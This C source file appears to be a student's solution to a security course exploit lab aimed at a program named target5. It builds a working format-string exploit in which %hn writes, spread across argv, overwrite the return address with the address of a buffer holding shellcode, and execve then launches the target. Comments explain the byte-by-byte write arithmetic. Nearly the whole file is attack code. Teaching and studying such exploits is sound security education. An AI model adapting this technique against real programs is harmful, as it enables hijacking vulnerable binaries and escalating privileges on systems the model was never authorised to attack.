#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "../targets/target5"

int
main(const int argc, const char * argv[])
{
    // This is the addresses (in 2 byte increments) I want to write to
    // "\xc8\x0e\x82\x56\x00\x00\x00\x00"
    // "\xca\x0e\x82\x56\x00\x00\x00\x00"
    // "\xcc\x0e\x82\x56\x00\x00\x00\x00"
    // "\xce\x0e\x82\x56\x00\x00\x00\x00"

    char payload[256];

    // Format string is 48 chars long (includes null terminator).
    // Format string writes 2 bytes at a time. Each time I print out enough characters
    // using %{number}x so that I get the desired value for writing the 2 bytes.
    // Note that I'm only writing from the bottom 2 bytes of the number of chars printed
    // out's hex value (e.g. If I want to write 0x0000 I will print 35536 chars, which is
    // 0x10000, but since I'm only taking the bottom 2 bytes, 0x0000, I only write 0x0000).

    // The format string write 0x56820ec8 (address of alignedBuffer) to the return address.
    // We want to write to alignedBuffer, because that is where the shellcode will be stored.

    // 47 chars + nullbyte => 48 bytes
    char format_string[] = 
            "aaa%3333x%12$hn%18810x%13$hn%43390x%14$hn%15$hn";

    // Empty strings are used to add 0 byte paddings to the upper 32 bits.
    // Shellcode is put at the end of the payload so that its length doesn't
    // affect the validity of the format string and, effectively, the overall payload.
    char * args[] = { format_string, "\xc8\x0e\x82\x56","","","","\xca\x0e\x82\x56","","","",
                                     "\xcc\x0e\x82\x56","","","","\xce\x0e\x82\x56","","","", 
                                     shellcode, NULL };
    char * env[] = { NULL };

    execve(TARGET, args, env);

    printf("ERROR: execve failed.\n");
    return(-1);
}